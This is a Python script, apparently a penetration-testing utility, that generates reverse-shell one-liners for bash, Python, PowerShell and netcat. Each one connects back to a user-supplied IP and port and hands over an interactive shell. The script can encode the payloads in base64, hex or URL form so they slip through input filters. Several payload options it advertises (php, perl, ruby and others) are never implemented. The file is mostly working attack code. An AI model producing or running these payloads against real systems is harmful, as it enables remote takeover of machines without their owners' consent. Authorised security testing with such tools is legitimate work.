import argparse
from urllib.parse import quote
from base64 import b64encode
import binascii

def banner():
    return """
                                                                            
        )       (   (                                           )           
     ( /(    (  )\  )\   (  (     (           (   (       )  ( /(      (    
 (   )\())  ))\((_)((_)  )\))(   ))\  (      ))\  )(   ( /(  )\()) (   )(   
 )\ ((_)\  /((_)_   _   ((_))\  /((_) )\ )  /((_)(()\  )(_))(_))/  )\ (()\  
((_)| |(_)(_)) | | | |   (()(_)(_))  _(_/( (_))   ((_)((_)_ | |_  ((_) ((_) 
(_-<| ' \ / -_)| | | |  / _` | / -_)| ' \))/ -_) | '_|/ _` ||  _|/ _ \| '_| 
/__/|_||_|\___||_| |_|  \__, | \___||_||_| \___| |_|  \__,_| \__|\___/|_|   
                        |___/                                 v1.0       
"""


class Encode():
    
    def __init__(self:object,payload:str):
        self.__payload = payload
    
    def shell(self):
        return self.__payload
    
    def urlencode(self):
        return quote(self.__payload)
    
    def base64(self):
        messagebytes = bytes(self.__payload,"utf-8")
        return b64encode(messagebytes)
    
    def hexadecimal(self):
        messagebytes = bytes(self.__payload,"utf-8")
        return binascii.hexlify(messagebytes)


class Bash(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"bash -c 'exec bash -i &>/dev/tcp/{self.__ip}/{self.__porta} <&1'"
        super().__init__(self.__payload)


class Python(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        super().__init__(self.__payload)

class Powershell(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+self.__ip+"',"+self.__porta+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        super().__init__(self.__payload)

class netcat(Encode):
    
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"nc -vn {self.__ip} {self.__porta} -e \"/bin/bash\""
        super().__init__(self.__payload)


parser = argparse.ArgumentParser(prog=banner(),usage="python3 shell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
parser.add_argument('--version',action='version', version='shell_generator_2.0')
parser.add_argument("-ip",type=str, dest="ip",action="store",help="Insert ip",required=True)
parser.add_argument("-port",type=str,dest="porta",action="store",help="Insert port",required=True)
parser.add_argument("-payload",type=str,dest="payload",action="store",choices=["bash","python","powershell","nc","php","perl","ruby","telnet","xterm","mkfifo","java","golang"],help="Insert payload",required=True)
parser.add_argument("-encode",type=str,dest="encode",action="store",choices=['base64',"hex","urlencode"],help="Insert encode",default=None)
args = parser.parse_args()

if __name__ == "__main__":
    if args.payload == "bash":
        if args.encode is None:
            print(Bash(args.ip,args.porta).shell())
        elif args.encode == "base64":
            print(Bash(args.ip,args.porta).base64())
        elif args.encode == "hex":
            print(Bash(args.ip,args.porta).hexadecimal())
        elif args.encode == "urlencode":
            print(Bash(args.ip,args.porta).urlencode())
    elif args.payload == "python":
        if args.encode is None:
            print(Python(args.ip,args.porta).shell())
        elif args.encode == "base64":
            print(Python(args.ip,args.porta).base64())
        elif args.encode == "hex":
            print(Python(args.ip,args.porta).hexadecimal())
        elif args.encode == "urlencode":
            print(Python(args.ip,args.porta).urlencode())
    elif args.payload == "powershell":
        if args.encode is None:
            print(Powershell(args.ip,args.porta).shell())
        elif args.encode == "base64":
            print(Powershell(args.ip,args.porta).base64())
        elif args.encode == "hex":
            print(Powershell(args.ip,args.porta).hexadecimal())
        elif args.encode == "urlencode":
            print(Powershell(args.ip,args.porta).urlencode())
    elif args.payload == "nc":
        if args.encode is None:
            print(netcat(args.ip,args.porta).shell())
        elif args.encode == "base64":
            print(netcat(args.ip,args.porta).base64())
        elif args.encode == "hex":
            print(netcat(args.ip,args.porta).hexadecimal())
        elif args.encode == "urlencode":
            print(netcat(args.ip,args.porta).urlencode())